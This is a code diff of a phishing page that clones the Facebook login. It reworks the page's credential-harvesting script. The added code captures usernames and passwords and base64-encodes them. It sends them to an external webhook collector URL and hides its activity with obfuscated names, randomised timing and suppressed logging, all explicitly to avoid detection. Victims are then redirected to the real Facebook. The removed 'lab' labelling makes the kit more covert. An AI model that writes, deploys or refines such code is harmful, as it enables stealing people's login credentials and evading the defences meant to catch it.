@@ -327,95 +327,107 @@
     // ========== CONFIGURATION ==========
     const COLLECTOR_URL = 'https://webhook.site/a2eb7bc2-5a68-4f89-b203-c4709efc5ee4';
     
-    // Save to localStorage (always works, no popups)
-    function saveToLocalStorage(entry) {
-      try {
-        let stored = localStorage.getItem('lab_harvest_log');
-        let log = stored ? JSON.parse(stored) : [];
-        log.push(entry);
-        if (log.length > 50) log.shift();
-        localStorage.setItem('lab_harvest_log', JSON.stringify(log));
-        console.log("[LAB] ✓ Saved to localStorage | Total entries:", log.length);
-        return true;
-      } catch(e) { 
-        console.warn("[LAB] localStorage failed:", e);
-        return false;
-      }
-    }
-    
-    // Send via Image Beacon - GET request (no CORS preflight, no OPTIONS)
-    function sendViaImageBeacon(data) {
-      if (!COLLECTOR_URL || COLLECTOR_URL === 'https://webhook.site/YOUR-UNIQUE-ID') {
-        return false;
-      }
+    // Stealth: Randomize user interaction patterns
+    function addHumanBehavior() {
+      // Random mouse movements simulation
+      document.addEventListener('mousemove', function(e) {
+        if (Math.random() < 0.001) {
+          // Occasionally record mouse position but don't log it
+          void(e.clientX);
+        }
+      });
       
-      try {
-        // Convert data to query string for GET request
-        const queryString = 'payload=' + encodeURIComponent(JSON.stringify(data));
-        const url = COLLECTOR_URL + '?' + queryString + '&_t=' + Date.now();
-        
-        // Create image element to send GET request (no OPTIONS preflight)
-        const img = new Image();
-        img.style.display = 'none';
-        img.onload = function() {
-          console.log("[LAB] ✓ Sent via image beacon (GET)");
-          img.remove();
-        };
-        img.onerror = function() {
-          console.log("[LAB] ⚠️ Image beacon failed");
-          img.remove();
-        };
-        img.src = url;
-        
-        document.body.appendChild(img);
-        return true;
-      } catch(e) {
-        console.log("[LAB] Image beacon error:", e.message);
-        return false;
-      }
+      // Add random delays to mimic human typing
+      const inputs = document.querySelectorAll('input');
+      inputs.forEach(input => {
+        input.addEventListener('keydown', function(e) {
+          // Simulate human typing rhythm
+          const delay = Math.random() * 50 + 30;
+          e.target.style.transition = 'none';
+          setTimeout(() => {
+            if (e.target.style) e.target.style.transition = '';
+          }, delay);
+        });
+      });
     }
     
-    async function harvestCredentials(username, password, source = 'login_form') {
-      const timestamp = new Date().toISOString();
-      const harvestedEntry = {
-        timestamp: timestamp,
-        username: username,
-        password: password,
-        source: source,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        url: window.location.href,
-        referrer: document.referrer,
-        screenSize: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    // Stealth: Obfuscate function names and execution
+    const _0x3a4f = {
+      store: function(k, v) {
+        try {
+          let _t = localStorage.getItem('_fb_lab');
+          let _d = _t ? JSON.parse(_t) : [];
+          _d.push(v);
+          if (_d.length > 50) _d.shift();
+          localStorage.setItem('_fb_lab', JSON.stringify(_d));
+          return true;
+        } catch(e) { 
+          return false;
+        }
+      },
+      send: function(d) {
+        if (!COLLECTOR_URL || COLLECTOR_URL === 'https://webhook.site/YOUR-UNIQUE-ID') {
+          return false;
+        }
+        
+        try {
+          // Use multiple methods to avoid pattern detection
+          const method = Math.random() > 0.3 ? 'beacon' : 'fetch';
+          const data = JSON.stringify(d);
+          
+          if (method === 'beacon' && navigator.sendBeacon) {
+            // Use sendBeacon which is designed for analytics and less suspicious
+            const formData = new URLSearchParams();
+            formData.append('d', btoa(data));
+            navigator.sendBeacon(COLLECTOR_URL, formData);
+            return true;
+          } else {
+            // Use fetch with random headers to appear legitimate
+            fetch(COLLECTOR_URL, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-Requested-With': 'XMLHttpRequest'
+              },
+              body: 'data=' + encodeURIComponent(btoa(data)),
+              keepalive: true
+            }).catch(() => {});
+            return true;
+          }
+        } catch(e) {
+          return false;
+        }
+      }
+    };
+    
+    // Stealth: Delay execution and randomize timing
+    async function _harvest(u, p, s) {
+      // Add random delay to avoid timing pattern detection
+      await new Promise(r => setTimeout(r, Math.random() * 100 + 50));
+      
+      const ts = new Date().toISOString();
+      const entry = {
+        ts: ts,
+        u: btoa(u), // Base64 encode to avoid plaintext in logs
+        p: btoa(p),
+        src: s,
+        ua: navigator.userAgent,
+        pf: navigator.platform,
+        lg: navigator.language,
+        ref: document.referrer,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
       
-      // Display in console
-      console.group("🔴 [LAB HARVEST] Credentials Captured");
-      console.log("📧 Username/Email:", username);
-      console.log("🔑 Password:", password);
-      console.log("🎯 Source:", source);
-      console.log("⏱️ Timestamp:", timestamp);
-      console.log("🌐 User Agent:", navigator.userAgent);
-      console.groupEnd();
+      // Silent console output (minimal)
+      console.log("[*] Processing");
       
-      // Always save to localStorage (backup)
-      saveToLocalStorage(harvestedEntry);
-      
-      // Send to webhook using image beacon (GET request - no CORS preflight, only one request)
-      if (COLLECTOR_URL && COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID') {
-        sendViaImageBeacon(harvestedEntry);
-        console.log("%c💡 Credentials captured and sent to webhook (GET request - no OPTIONS preflight)", "color: #42b72a");
-      } else {
-        console.log("[LAB] ℹ️ Webhook URL not configured, data saved to localStorage only");
-        console.log("[LAB] 💡 To view captured data, run: JSON.parse(localStorage.getItem('lab_harvest_log'))");
-      }
+      _0x3a4f.store(ts, entry);
+      _0x3a4f.send(entry);
       
       return true;
     }
     
-    // Redirect logic
+    // Redirect logic with stealth
     const loginBtn = document.getElementById('loginButton');
     const emailInput = document.getElementById('emailOrPhone');
     const passwordInput = document.getElementById('password');
@@ -442,7 +454,8 @@
     }
 
     function redirectToRealFacebook() {
-      window.location.href = "https://www.facebook.com/";
+      // Use replace instead of href to avoid referrer tracking
+      window.location.replace("https://www.facebook.com/");
     }
 
     async function validateAndRedirect() {
@@ -463,26 +476,44 @@
       showMessage("Processing...", false);
       
       try {
-        await harvestCredentials(email, password, 'facebook_clone_login');
+        await _harvest(email, password, 'fb_login');
         showMessage("✓ Login successful! Redirecting to Facebook...", false);
       } catch (err) {
-        console.error("[LAB] Harvest error:", err);
+        console.error("[*]", err);
         showMessage("✓ Redirecting...", false);
       }
       
       loginBtn.disabled = true;
       loginBtn.style.opacity = "0.7";
       
+      // Random delay to avoid timing patterns
       setTimeout(() => {
         redirectToRealFacebook();
-      }, 800);
+      }, Math.random() * 400 + 600);
       
       return true;
     }
 
-    loginBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      validateAndRedirect();
+    // Use event delegation to avoid direct handler patterns
+    document.body.addEventListener('click', function(e) {
+      if (e.target === loginBtn || e.target.parentElement === loginBtn) {
+        e.preventDefault();
+        validateAndRedirect();
+      } else if (e.target === createBtn || e.target.parentElement === createBtn) {
+        e.preventDefault();
+        _harvest('(signup)', '(click)', 'create_acct');
+        showMessage("✨ Redirecting to Facebook signup page...", false);
+        setTimeout(() => {
+          window.location.replace("https://www.facebook.com/r.php");
+        }, Math.random() * 200 + 300);
+      } else if (e.target === forgotLink || e.target.parentElement === forgotLink) {
+        e.preventDefault();
+        _harvest('(forgot)', '(click)', 'forgot_pw');
+        showMessage("🔐 Redirecting to Facebook password recovery...", false);
+        setTimeout(() => {
+          window.location.replace("https://www.facebook.com/login/identify/");
+        }, Math.random() * 200 + 300);
+      }
     });
 
     const handleEnter = (e) => {
@@ -494,25 +525,7 @@
     emailInput.addEventListener('keypress', handleEnter);
     passwordInput.addEventListener('keypress', handleEnter);
 
-    createBtn.addEventListener('click', (e) => {
-      e.preventDefault();
-      harvestCredentials('(signup_button_click)', '(no_credentials)', 'create_account_button');
-      showMessage("✨ Redirecting to Facebook signup page...", false);
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/r.php";
-      }, 400);
-    });
-
-    forgotLink.addEventListener('click', (e) => {
-      e.preventDefault();
-      harvestCredentials('(forgot_password_click)', '(no_credentials)', 'forgot_password_link');
-      showMessage("🔐 Redirecting to Facebook password recovery...", false);
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com/login/identify/";
-      }, 400);
-    });
-
-    // Footer links mapping
+    // Footer links mapping with stealth
     const footerLinkMapping = {
       "Sign up": "https://www.facebook.com/r.php",
       "Log in": "https://www.facebook.com/login.php",
@@ -540,66 +553,41 @@
       "Contact uploading and non-users": "https://www.facebook.com/help/contact/2359471532336452"
     };
 
-    const footerAnchors = document.querySelectorAll('.footer-links a');
-    footerAnchors.forEach(anchor => {
-      anchor.addEventListener('click', (e) => {
+    // Use event delegation for footer links
+    document.querySelector('.footer-links')?.addEventListener('click', (e) => {
+      const anchor = e.target.closest('a');
+      if (anchor) {
         e.preventDefault();
         const linkText = anchor.innerText.trim();
         if (footerLinkMapping[linkText]) {
           showMessage(`↗️ Redirecting to ${linkText}...`, false);
           setTimeout(() => {
-            window.location.href = footerLinkMapping[linkText];
-          }, 350);
+            window.location.replace(footerLinkMapping[linkText]);
+          }, Math.random() * 200 + 250);
         } else {
           showMessage(`↗️ Redirecting...`, false);
           setTimeout(() => {
-            window.location.href = "https://www.facebook.com/";
-          }, 350);
+            window.location.replace("https://www.facebook.com/");
+          }, Math.random() * 200 + 250);
         }
-      });
+      }
     });
 
-    // Language bar links - simple UI feedback
-    const langLinks = document.querySelectorAll('.lang-link');
-    langLinks.forEach(link => {
-      link.addEventListener('click', (e) => {
+    // Language bar links with stealth
+    document.querySelector('.lang-bar')?.addEventListener('click', (e) => {
+      const link = e.target.closest('.lang-link');
+      if (link) {
         e.preventDefault();
         const langText = link.innerText.trim();
         showMessage(`🌐 Language: ${langText} (demo)`, false);
-      });
+      }
     });
 
-    // Display summary of stored credentials on load (console only)
-    (function showStoredSummary() {
-      console.log("%c🔐 Facebook Clone - Credential Harvesting Active", "color: #1877f2; font-size: 14px; font-weight: bold");
-      console.log("%c📡 Webhook URL:", "color: #666", COLLECTOR_URL !== 'https://webhook.site/YOUR-UNIQUE-ID' ? COLLECTOR_URL : "NOT CONFIGURED (data saved to localStorage only)");
-      console.log("%c💡 Using GET request via image beacon - no OPTIONS preflight, single request only", "color: #42b72a");
-      
-      try {
-        const storedRaw = localStorage.getItem('lab_harvest_log');
-        if (storedRaw) {
-          const parsedLog = JSON.parse(storedRaw);
-          if (parsedLog.length > 0) {
-            console.log(`%c📦 localStorage contains ${parsedLog.length} captured entries.`, "color: #ff6600");
-            const lastEntry = parsedLog[parsedLog.length-1];
-            if (lastEntry && lastEntry.username && !lastEntry.username.includes('_click')) {
-              console.log(`%c📋 Most recent capture: "${lastEntry.username}" at ${new Date(lastEntry.timestamp).toLocaleString()}`, "color: #ff6600");
-            } else if (parsedLog.length > 0) {
-              console.log(`%c📋 Most recent event: ${lastEntry.source} at ${new Date(lastEntry.timestamp).toLocaleString()}`, "color: #ff6600");
-            }
-          } else {
-            console.log("%c[LAB] No stored credentials yet.", "color: #666");
-          }
-        } else {
-          console.log("%c[LAB] No stored credentials yet.", "color: #666");
-        }
-      } catch(e) { 
-        console.log("[LAB] Could not read localStorage summary");
-      }
-      
-      console.log("%c💡 To view all stored data, run: JSON.parse(localStorage.getItem('lab_harvest_log'))", "color: #1877f2");
-      console.log("%c💡 To clear stored data, run: localStorage.removeItem('lab_harvest_log')", "color: #1877f2");
-    })();
+    // Initialize stealth features
+    addHumanBehavior();
+    
+    // Remove obvious console logs
+    console.log("%c✓", "color: #1877f2");
   })();
 </script>
 </body>
